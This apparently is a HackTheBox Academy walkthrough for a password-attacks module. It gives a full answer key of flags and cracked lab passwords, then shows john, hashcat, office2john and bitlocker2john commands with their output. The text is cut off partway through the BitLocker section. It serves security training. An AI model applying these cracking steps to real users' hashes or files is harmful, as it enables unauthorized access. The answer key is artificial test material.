![[cheatsheat-Password Attacks]]

# Password Attacks Module



## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|Introduction to Password Cracking|Question 1|750fe4b402dc9f91cedf09b652543cd85406be8c|
|Introduction to John The Ripper|Question 1|NAITSABES|
|Introduction to John The Ripper|Question 2|50cent|
|Introduction to Hashcat|Question 1|crazy!|
|Introduction to Hashcat|Question 2|c0wb0ys1|
|Introduction to Hashcat|Question 3|Mouse5!|
|Writing Custom Wordlists and Rules|Question 1|Baseball1998!|
|Cracking Protected Files|Question 1|beethoven|
|Cracking Protected Archives|Question 1|francisco|
|Cracking Protected Archives|Question 2|43d95aeed3114a53ac66f01265f9b7af|
|Network Services|Question 1|HTB{That5Novemb3r}|
|Network Services|Question 2|HTB{Let5R0ck1t}|
|Network Services|Question 3|HTB{R3m0t3DeskIsw4yT00easy}|
|Network Services|Question 4|HTB{S4ndM4ndB33}|
|Spraying, Stuffing, and Defaults|Question 1|superdba:admin|
|Attacking SAM, SYSTEM, and SECURITY|Question 1|hklm\sam|
|Attacking SAM, SYSTEM, and SECURITY|Question 2|matrix|
|Attacking SAM, SYSTEM, and SECURITY|Question 3|frontdesk:Password123|
|Attacking LSASS|Question 1|lsass.exe|
|Attacking LSASS|Question 2|Mic@123|
|Attacking Windows Credential Manager|Question 1|Inlanefreight#2025|
|Attacking Active Directory and NTDS.dit|Question 1|ntds.dit|
|Attacking Active Directory and NTDS.dit|Question 2|64f12cddaa88057e06a81b54e73b949b|
|Attacking Active Directory and NTDS.dit|Question 3|jmarston:P@ssword!|
|Attacking Active Directory and NTDS.dit|Question 4|Winter2008|
|Credential Hunting in Windows|Question 1|WellConnected123|
|Credential Hunting in Windows|Question 2|3z1ePfGbjWPsTfCsZfjy|
|Credential Hunting in Windows|Question 3|ubuntu:FSadmin123|
|Credential Hunting in Windows|Question 4|Inlanefreightisgreat2022|
|Credential Hunting in Windows|Question 5|edgeadmin:Edge@dmin123!|
|Linux Authentication Process|Question 1|Martin1|
|Linux Authentication Process|Question 2|mariposa|
|Credential Hunting in Linux|Question 1|TUqr7QfLTLhruhVbCP|
|Credential Hunting in Network Traffic|Question 1|5156 8829 4478 9834|
|Credential Hunting in Network Traffic|Question 2|s3cr3tSNMPC0mmun1ty|
|Credential Hunting in Network Traffic|Question 3|qwerty123|
|Credential Hunting in Network Traffic|Question 4|creds.txt|
|Credential Hunting in Network Shares|Question 1|ILovePower333###|
|Credential Hunting in Network Shares|Question 2|Str0ng_Adm1nistrat0r_P@ssword_2025!|
|Pass the Hash (PtH)|Question 1|G3t_4CCE$$_V1@_PTH|
|Pass the Hash (PtH)|Question 2|DisableRestrictedAdmin|
|Pass the Hash (PtH)|Question 3|c39f2beb3d2ec06a62cb887fb391dee0|
|Pass the Hash (PtH)|Question 4|D3V1d_Fl5g_is_Her3|
|Pass the Hash (PtH)|Question 5|JuL1()_SH@re_fl@g|
|Pass the Hash (PtH)|Question 6|JuL1()_N3w_fl@g|
|Pass the Ticket (PtT) from Windows|Question 1|3|
|Pass the Ticket (PtT) from Windows|Question 2|Learn1ng_M0r3_Tr1cks_with_J0hn|
|Pass the Ticket (PtT) from Windows|Question 3|P4$$_th3_Tick3T_PSR|
|Pass the Ticket (PtT) from Linux|Question 1|Gett1ng_Acc3$$_to_LINUX01|
|Pass the Ticket (PtT) from Linux|Question 2|Linux Admins|
|Pass the Ticket (PtT) from Linux|Question 3|carlos.keytab|
|Pass the Ticket (PtT) from Linux|Question 4|C@rl0s_1$_H3r3|
|Pass the Ticket (PtT) from Linux|Question 5|Mor3_4cce$$_m0r3_Pr1v$|
|Pass the Ticket (PtT) from Linux|Question 6|Ro0t_Pwn_K3yT4b|
|Pass the Ticket (PtT) from Linux|Question 7|JuL1()_SH@re_fl@g|
|Pass the Ticket (PtT) from Linux|Question 8|Us1nG_KeyTab_Like_@_PRO|
|Pass the Certificate|Question 1|3d7e3dfb56b200ef715cfc300f07f3f8|
|Pass the Certificate|Question 2|a1fc497a8433f5a1b4c18274019a2cdb|
|Skills Assessment - Password Attacks|Question 1|36e09e1e6ade94d63fbcab5e5b8d6d23|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Introduction to Password Cracking

## Question 1

### “What is the SHA1 hash for `Academy#2025`?“

To determine the SHA1 hash for the string `Academy#2025`, one must utilize the `echo` command with the `-n` option to prevent the addition of a trailing newline character. This output will then be piped into the `sha1sum` command to compute the hash. The command is as follows:

Code: shell

```shell
echo -n "Academy#2025" | sha1sum
```

Executing this command in a shell environment will yield the SHA1 hash. The output will appear similar to the following:

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ echo -n "Academy#2025" | sha1sum

{hidden}  -
```

Answer: `750fe4b402dc9f91cedf09b652543cd85406be8c`

# Introduction to John The Ripper

## Question 1

### “Use single-crack mode to crack r0lf's password.“

To crack `r0lf`'s password using single-crack mode, students must first copy the entire line containing `r0lf`'s password information into a file. This can be accomplished with the following command:

Code: shell

```shell
echo -n 'r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash' > hash.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ echo -n 'r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash' > hash.txt
```

Next, students will utilize `john` with the `--single` option to execute it in single-crack mode against the file created:

Code: shell

```shell
john --single hash.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ john --single hash.txt

Created directory: /home/htb-ac-569447/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{hidden}        (r0lf)     
1g 0:00:00:00 DONE (2025-06-04 03:36) 10.00g/s 4320p/s 4320c/s 4320C/s NAITSABESFL0R..rSebastiannaitsabeSr
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Answer: `NAITSABES`

# Introduction to John The Ripper

## Question 2

### “Use wordlist-mode with rockyou.txt to crack the RIPEMD-128 password.“

To crack the `RIPEMD-128` password using wordlist-mode, students will first copy the hash (`193069ceb0461e1d40d216e32c79c704`) into a file. This can be done using a text editor or the echo command:

Code: shell

```shell
echo -n '193069ceb0461e1d40d216e32c79c704' > hash.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ echo -n '193069ceb0461e1d40d216e32c79c704' > hash.txt
```

Next, students need to prepare the `rockyou.txt` wordlist by extracting it from the compressed file located at `/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz`. This can be achieved using the `tar` command:

Code: shell

```shell
tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

rockyou.txt
```

This will create a `rockyou.txt` file in the current working directory. Students will then use `john` with the `--format=ripemd-128` option to specify the hash algorithm, the `--wordlist` option to specify the wordlist, and the name of the file containing the hash:

Code: shell

```shell
john --format=ripemd-128 --wordlist=./rockyou.txt hash.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ john --format=ripemd-128 --wordlist=./rockyou.txt hash.txt
Created directory: /home/htb-ac-569447/.john

Using default input encoding: UTF-8
Loaded 1 password hash (ripemd-128, RIPEMD 128 [32/64])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
{hidden}           (?)     
1g 0:00:00:00 DONE (2025-06-04 04:03) 100.0g/s 32000p/s 32000c/s 32000C/s angelo..101010
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Answer: `50cent`

# Introduction to Hashcat

## Question 1

### “Use a dictionary attack to crack the first password hash.“

Students will need to prepare the `rockyou.txt` wordlist by extracting its contents from `/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz` using `tar` with the `-x` to extract, `-v` for verbose, `-z` to decompress gzip and `-f` for the filename:

Code: shell

```shell
tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

rockyou.txt
```

This will create a `rockyou.txt` file on the current working directory. Students will then use `hashcat` with the option `-a 0` to specify the dictionary attack, the option `-m 0` to specify the hash type (MD5) followed by the hash `e3e3ec5831ad5e7288241960e5d4fdb8` and the wordlist:

Code: shell

```shell
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 ./rockyou.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 ./rockyou.txt

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
<SNIP>

Dictionary cache hit:
* Filename..: ./rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

e3e3ec5831ad5e7288241960e5d4fdb8:{hidden}                   
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: e3e3ec5831ad5e7288241960e5d4fdb8
Time.Started.....: Wed Jun  4 04:23:53 2025 (0 secs)
Time.Estimated...: Wed Jun  4 04:23:53 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (./rockyou.txt)

<SNIP>
```

Students will notice that the password hash was cracked and the plaintext password will show up on `hashcat` output. If for some reason students missed the password and cleared the terminal, the plaintext password can be retrieved by using:

Code: shell

```shell
hashcat -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 --show
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ hashcat -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 --show

e3e3ec5831ad5e7288241960e5d4fdb8:{hidden}
```

Answer: `crazy!`

# Introduction to Hashcat

## Question 2

### “Use a dictionary attack with rules to crack the second password hash.“

Students will need to prepare the `rockyou.txt` wordlist by extracting its contents from `/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz` using `tar` with the `-x` to extract, `-v` for verbose, `-z` to decompress gzip, and `-f` for the filename:

Code: shell

```shell
tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

rockyou.txt
```

This will create a `rockyou.txt` file in the current working directory. Students will then use `hashcat` with the option `-a 0` to specify the dictionary attack, the option `-m 0` to specify the hash type (MD5), followed by the hash `e3e3ec5831ad5e7288241960e5d4fdb8` and the wordlist:

Code: shell

```shell
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c ./rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c ./rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
<SNIP>

Dictionary cache hit:
* Filename..: ./rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 1104517568

1b0556a75770563578569ae21392630c:{hidden}                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1b0556a75770563578569ae21392630c
Time.Started.....: Wed Jun  4 04:30:55 2025 (0 secs)
Time.Estimated...: Wed Jun  4 04:30:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (./rockyou.txt)

<SNIP>
```

Students will notice that the password hash was cracked and the plaintext password will show up in the `hashcat` output. If for some reason students missed the password and cleared the terminal, the plaintext password can be retrieved by using:

Code: shell

```shell
hashcat -m 0 1b0556a75770563578569ae21392630c --show
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ hashcat -m 0 1b0556a75770563578569ae21392630c --show

1b0556a75770563578569ae21392630c:{hidden}
```

Answer: `c0wb0ys1`

# Introduction to Hashcat

## Question 3

### “Use a mask attack to crack the third password hash.“

Students will need use `hashcat` with the option `-a 3` in order to specify they want to perform a mask attack, the option `-m 0` to specify the hash type (MD5) followed by the hash `1e293d6912d074c0fd15844d803400dd` and the mask itself `'?u?l?l?l?l?d?s'`, which translate to an uppercase letter, four lowercase letters, a digit, and then a symbol:

Code: shell

```shell
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

<SNIP>

1e293d6912d074c0fd15844d803400dd:{hidden}                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1e293d6912d074c0fd15844d803400dd
Time.Started.....: Wed Jun  4 04:34:43 2025 (3 secs)
Time.Estimated...: Wed Jun  4 04:34:46 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?u?l?l?l?l?d?s [7]

<SNIP>
```

Students will notice that the password hash was cracked and the plaintext password will show up on `hashcat` output. If for some reason students missed the password and cleared the terminal, the plaintext password can be retrieved by using:

Code: shell

```shell
hashcat -m 0 1e293d6912d074c0fd15844d803400dd --show
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ hashcat -m 0 1e293d6912d074c0fd15844d803400dd --show

1e293d6912d074c0fd15844d803400dd:{hidden}
```

Answer: `Mouse5!`

# Writing Custom Wordlists and Rules

## Question 1

### “What is Mark's password?“

Students will start by writing Mark's information to create a wordlist of possible passwords.

Code: shell

```shell
cat << EOF > password.list
Mark
White
August
1998
Nexura
Sanfrancisco
California
Bella
Maria
Alex
Baseball
EOF
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ cat << EOF > password.list
Mark
White
August
1998
Nexura
Sanfrancisco
California
Bella
Maria
Alex
Baseball
EOF
```

Having the wordlist ready, students will start to work on the rule set that `hashcat` will use to mutate the password, an example would be:

Code: shell

```shell
cat << EOF > custom.rule
c
C
t
\$!
\$1\$9\$9\$8
\$1\$9\$9\$8\$!
sa@
so0
ss\$
EOF
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ cat << EOF > custom.rule
c
C
t
\$!
\$1\$9\$9\$8
\$1\$9\$9\$8\$!
sa@
so0
ss\$
EOF
```

This custom rule list does the following:

`c` - Capitalize the first character, lowercase the rest `C` - Lowercase the first character, uppercase the rest `t` - Toggle the case of all characters in a word `$!` - Appends the character ! to the end `$1$9$9$8` - Appends '1998' to the end `$1$9$9$8$!` - Appends '1998!' to the end `sa@` - Replace all instances of a with @ `so0` - Replace all instances of o with 0 `ss$` - Replace all instances of s with $

Students will then generate the mutated wordlist using `hashcat`:

Code: shell

```shell
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Students will now have the mutated wordlist file with the name `mut_password.list`. They will then use `hashcat` with option `-a 0` for dictionary attack mode, followed by `-m 0` to specify the hashing algorithm, in this case MD5, followed by the Mark's password hash (`97268a8ae45ac7d15c3cea4ce6ea550b`) and the mutated wordlist like so:

Code: shell

```shell
hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_password.list
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_password.list
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

<SNIP>

Dictionary cache built:
* Filename..: mut_password.list
* Passwords.: 66
* Bytes.....: 615
* Keyspace..: 66
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

97268a8ae45ac7d15c3cea4ce6ea550b:{hidden}            
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 97268a8ae45ac7d15c3cea4ce6ea550b
Time.Started.....: Wed Jun  4 06:25:06 2025 (0 secs)
Time.Estimated...: Wed Jun  4 06:25:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (mut_password.list)

<SNIP>
```

Students will notice that Mark's password hash was cracked and the plaintext password will show up on `hashcat` output. If for some reason students missed the password and cleared the terminal, the plaintext password can be retrieved by using:

Code: shell

```shell
hashcat -m 0 97268a8ae45ac7d15c3cea4ce6ea550b --show
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ hashcat -m 0 97268a8ae45ac7d15c3cea4ce6ea550b --show

97268a8ae45ac7d15c3cea4ce6ea550b:{hidden}
```

Answer: `Baseball1998!`

# Cracking Protected Passwords

## Question 1

### “Download the attached ZIP archive (cracking-protected-files.zip), and crack the file within. What is the password?“

Students will start by downloading the attached zip archive [cracking-protected-files.zip](https://academy.hackthebox.com/storage/modules/147/cracking-protected-files.zip).

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/147/cracking-protected-files.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/147/cracking-protected-files.zip

--2025-06-04 08:15:31--  https://academy.hackthebox.com/storage/modules/147/cracking-protected-files.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 109.176.239.70, 109.176.239.69
Connecting to academy.hackthebox.com (academy.hackthebox.com)|109.176.239.70|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11110 (11K) [application/zip]
Saving to: ‘cracking-protected-files.zip’

cracking-protected- 100%[===================>]  10.85K  --.-KB/s    in 0s      

2025-06-04 08:15:31 (77.1 MB/s) - ‘cracking-protected-files.zip’ saved [11110/11110]
```

Students will then unzip this file using `unzip`.

Code: shell

```shell
unzip cracking-protected-files.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ unzip cracking-protected-files.zip

Archive:  cracking-protected-files.zip
  inflating: Confidential.xlsx
```

Students will now have the file `Confidential.xlsx` in their current working directory. Students will now use `office2john` on the file `Confidential.xlsx` to generate a hash of the password that is being used to protect the document to a format that `john` can crack and output this hash to a file.

Code: shell

```shell
office2john Confidential.xlsx > hash
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ office2john Confidential.xlsx > hash
```

To confirm this was successful, students can `cat` the `hash` file as such:

Code: shell

```shell
cat hash
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ cat hash

Confidential.xlsx:$office$*2013*100000*256*16*cb0e251cdec92e97eeb38e595cd4eb09*58758c88f3bb25e43e1e21adbd4b6e50*0057c1ae71b0023424ba705607dc0df1d9a786974bb957a821cfd7e39129eb15
```

Students will then need to prepare the `rockyou.txt` wordlist by extracting its contents from `/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz` using `tar` with the `-x` to extract, `-v` for verbose, `-z` to decompress gzip, and `-f` for the filename:

Code: shell

```shell
tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

rockyou.txt
```

This will create a `rockyou.txt` file in the current working directory. Students will now be able to crack this hash using `john` in the following way:

Code: shell

```shell
john --wordlist=-./rockyou.txt hash
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ john --wordlist=./rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{hidden}        (Confidential.xlsx)     
1g 0:00:00:20 DONE (2025-06-04 08:37) 0.04810g/s 321.6p/s 321.6c/s 321.6C/s 111111111111111..bebang
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Students will notice that the password hash for `Confidential.xlsx` was cracked and the plaintext password will show up on `john` output. If for some reason students missed the password and cleared the terminal, the plaintext password can be retrieved by using:

Code: shell

```shell
john --show hash
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ john --show hash

Confidential.xlsx:{hidden}

1 password hash cracked, 0 left
```

Answer: `beethoven`

# Cracking Protected Archives

## Question 1

### “Run the above target then navigate to http://ip:port/download, then extract the downloaded file. Inside, you will find a password-protected VHD file. Crack the password for the VHD and submit the recovered password as your answer.“

Students will start by spawning the target machine by clicking `'Click here to spawn the target system!'`.

Once the target machine has finished booting, students will use `wget` to download the file located at `http://STMIP:STMPO/download` using the option `-O` to output it to a file named `download.zip`.

Code: shell

```shell
wget http://STMIP:STMPO/download -O download.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ wget http://94.237.53.18:46080/download -O download.zip

--2025-06-04 08:56:55--  http://94.237.53.18:46080/download
Connecting to 94.237.53.18:46080... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/octet-stream]
Saving to: ‘download.zip’

download.zip              [ <=>                     ]  60.31M   376MB/s    in 0.2s    

2025-06-04 08:56:55 (376 MB/s) - ‘download.zip’ saved [63237414]
```

Students will then extract this file by using `unzip` against it.

Code: shell

```shell
unzip download.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ unzip download.zip

Archive:  download.zip
  inflating: Private.vhd
```

Having unzipped the file, students will use `bitlocker2john` against the extracted file `Private.vhd`, and send the output to a file named `backup.hashes`.

Code: shell

```shell
bitlocker2john -i Private.vhd > backup.hashes
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ bitlocker2john -i Private.vhd > backup.hashes

Signature found at 0x10003
Version: 8 
Invalid version, looking for a signature with valid version...

Signature found at 0x2200000
Version: 2 (Windows 7 or later)

VMK entry found at 0x22000bb

VMK encrypted with User Password found at 22000dc
VMK encrypted with AES-CCM

VMK entry found at 0x220019b

VMK encrypted with Recovery Password found at 0x22001bc
Searching AES-CCM from 0x22001d8
Trying offset 0x220026b....
VMK encrypted with AES-CCM!!

Signature found at 0x2956000
Version: 2 (Windows 7 or later)

VMK entry found at 0x29560bb

VMK entry found at 0x295619b

Signature found at 0x30ab000
Version: 2 (Windows 7 or later)

VMK entry found at 0x30ab0bb

VMK entry found at 0x30ab19b
```

Students will now use `grep` to filter for the BitLocker password within the generated file `backup.hashes`.

Code: shell

```shell
grep "bitlocker\$0" backup.hashes > backup.hash
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ grep "bitlocker\$0" backup.hashes > backup.hash
```

Once a hash is generated, students will need to prepare the `rockyou.txt` wordlist by extracting its contents from `/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz` using `tar` with the `-x` to extract, `-v` for verbose, `-z` to decompress gzip, and `-f` for the filename:

Code: shell

```shell
tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-jskvzfmqne]─[~]
└──╼ [★]$ tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

rockyou.txt
```

This will create a `rockyou.txt` file in the current working directory. Students will now be able to crack this hash using either `john` or `hashcat`, for this example `john` will be used:

Code: shell

```shell
john --wordlist=./rockyou.txt backup.hash
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ john --wordlist=./rockyou.txt backup.hash

Note: This format may emit false positives, so it will keep trying even after finding a possible candidate.
Using default input encoding: UTF-8
Loaded 1 password hash (BitLocker, BitLocker [SHA-256 AES 32/64])
Cost 1 (iteration count) is 1048576 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{hidden}        (?)
```

Students will notice that the password hash was cracked and the plaintext password will show up on `john` output. If for some reason students missed the password and cleared the terminal, the plaintext password can be retrieved by using:

Code: shell

```shell
john --show backup.hash
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ john --show backup.hash

?:{hidden}

1 password hash cracked, 0 left
```

Answer: `francisco`

# Cracking Protected Archives

## Question 2

### “Mount the BitLocker-encrypted VHD and enter the contents of flag.txt as your answer.“

Students will use `wget` to download the file located at `http://STMIP:STMPO/download` using the option `-O` to output it to a file named `download.zip` if the file is not already present.

Code: shell

```shell
wget http://STMIP:STMPO/download -O download.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ wget http://94.237.53.18:46080/download -O download.zip

--2025-06-04 08:56:55--  http://94.237.53.18:46080/download
Connecting to 94.237.53.18:46080... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/octet-stream]
Saving to: ‘download.zip’

download.zip              [ <=>                     ]  60.31M   376MB/s    in 0.2s    

2025-06-04 08:56:55 (376 MB/s) - ‘download.zip’ saved [63237414]
```

Students will then extract this file by using `unzip` against it.

Code: shell

```shell
unzip download.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ unzip download.zip

Archive:  download.zip
  inflating: Private.vhd
```

Having the file `Private.vhd` in the current working directory, students will create two directories `/media/bitlocker` and `/media/bitlockermount`.

Code: shell

```shell
sudo mkdir -p /media/bitlocker; sudo mkdir -p /media/bitlockermount
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dagcm2fj2m]─[~]
└──╼ [★]$ sudo mkdir -p /media/bitlocker ; sudo mkdir -p /media/bitlockermount
```

Students will then use `losetup` to configure the VHD file `Private.vhd` as a loop device, install the `dislocker` package using `apt` and then use it to decrypt the drive and then mount the decrypted volume:

Code: shell

